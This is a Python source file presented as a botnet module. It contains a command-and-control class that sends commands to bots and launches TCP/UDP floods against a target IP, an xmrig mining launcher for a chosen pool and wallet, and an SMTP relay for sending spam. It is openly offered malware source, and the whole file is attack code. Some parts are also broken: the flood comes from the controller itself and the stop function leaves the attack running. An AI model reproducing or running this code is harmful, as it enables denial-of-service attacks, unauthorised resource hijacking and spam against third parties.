# Botnet Module
import platform
import subprocess
import threading
import time
import socket
import requests
import hashlib

class BotnetController:
    def __init__(self):
        self.bots = []
        self.target = None
        self.attack_type = None
        
    def add_bot(self, bot_id: str, ip: str, port: int):
        """Add a bot to the botnet"""
        self.bots.append({
            "id": bot_id,
            "ip": ip,
            "port": port,
            "status": "active"
        })
        return {"success": True, "message": f"Bot {bot_id} added"}
    
    def remove_bot(self, bot_id: str):
        """Remove a bot from the botnet"""
        self.bots = [b for b in self.bots if b["id"] != bot_id]
        return {"success": True, "message": f"Bot {bot_id} removed"}
    
    def list_bots(self):
        """List all bots"""
        return {"success": True, "bots": self.bots, "count": len(self.bots)}
    
    def send_command(self, command: str, target_bot: str = None):
        """Send command to bots"""
        results = {}
        
        for bot in self.bots:
            if target_bot and bot["id"] != target_bot:
                continue
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((bot["ip"], bot["port"]))
                
                # Send command
                data = command.encode()
                sock.sendall(len(data).to_bytes(4, 'big'))
                sock.sendall(data)
                
                # Receive response
                length_data = sock.recv(4)
                if length_data:
                    length = int.from_bytes(length_data, 'big')
                    response = sock.recv(length).decode()
                    results[bot["id"]] = response
                
                sock.close()
            except Exception as e:
                results[bot["id"]] = f"Error: {e}"
        
        return {"success": True, "results": results}
    
    def start_ddos(self, target_ip: str, target_port: int, attack_type: str = "tcp"):
        """Start DDoS attack from all bots"""
        self.target = target_ip
        self.attack_type = attack_type
        
        def attack_loop():
            while True:
                for bot in self.bots:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        
                        if attack_type == "tcp":
                            sock.connect((target_ip, target_port))
                            sock.sendall(b'X' * 1024)
                        elif attack_type == "udp":
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(b'X' * 1024, (target_ip, target_port))
                        
                        sock.close()
                    except:
                        pass
                
                time.sleep(0.1)
        
        thread = threading.Thread(target=attack_loop, daemon=True)
        thread.start()
        
        return {
            "success": True,
            "message": f"DDoS started: {target_ip}:{target_port} ({attack_type})",
            "bots": len(self.bots)
        }
    
    def stop_ddos(self):
        """Stop DDoS attack"""
        self.target = None
        self.attack_type = None
        return {"success": True, "message": "DDoS stopped"}


class CryptoMiner:
    def __init__(self):
        self.mining = False
        self.thread = None
        
    def start_mining(self, pool: str, wallet: str, algorithm: str = "cryptonight"):
        """Start cryptocurrency mining"""
        try:
            self.mining = True
            
            def mine_loop():
                # Use xmrig or similar miner
                cmd = [
                    'xmrig',
                    '-o', pool,
                    '-u', wallet,
                    '--algo', algorithm
                ]
                
                subprocess.run(cmd)
            
            self.thread = threading.Thread(target=mine_loop, daemon=True)
            self.thread.start()
            
            return {"success": True, "message": f"Mining started on {pool}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def stop_mining(self):
        """Stop mining"""
        self.mining = False
        if self.thread:
            # Kill the mining process
            subprocess.run(['pkill', 'xmrig'], capture_output=True)
        
        return {"success": True, "message": "Mining stopped"}
    
    def get_stats(self):
        """Get mining statistics"""
        try:
            result = subprocess.run(
                ['xmrig', '--stats'],
                capture_output=True, text=True
            )
            return {"success": True, "stats": result.stdout}
        except:
            return {"success": False, "message": "Not mining"}


class SpamRelay:
    def __init__(self):
        self.smtp_servers = []
        
    def add_smtp(self, server: str, port: int = 25, username: str = '', password: str = ''):
        """Add SMTP server for spam relay"""
        self.smtp_servers.append({
            "server": server,
            "port": port,
            "username": username,
            "password": password
        })
        return {"success": True, "message": f"SMTP {server}:{port} added"}
    
    def send_spam(self, to_email: str, subject: str, body: str, from_email: str = "noreply@example.com"):
        """Send spam email"""
        try:
            import smtplib
            from email.mime.text import MIMEText
            
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = from_email
            msg['To'] = to_email
            
            for smtp in self.smtp_servers:
                try:
                    server = smtplib.SMTP(smtp["server"], smtp["port"], timeout=10)
                    if smtp["username"]:
                        server.login(smtp["username"], smtp["password"])
                    server.sendmail(from_email, [to_email], msg.as_string())
                    server.quit()
                    
                    return {"success": True, "message": f"Email sent via {smtp['server']}"}
                except:
                    continue
            
            return {"success": False, "message": "All SMTP servers failed"}
        except Exception as e:
            return {"success": False, "error": str(e)}


def start_ddos(target_ip: str, target_port: int, attack_type: str = "tcp"):
    """Quick DDoS start function"""
    bc = BotnetController()
    return bc.start_ddos(target_ip, target_port, attack_type)


def start_mining(pool: str, wallet: str):
    """Quick mining start function"""
    cm = CryptoMiner()
    return cm.start_mining(pool, wallet)
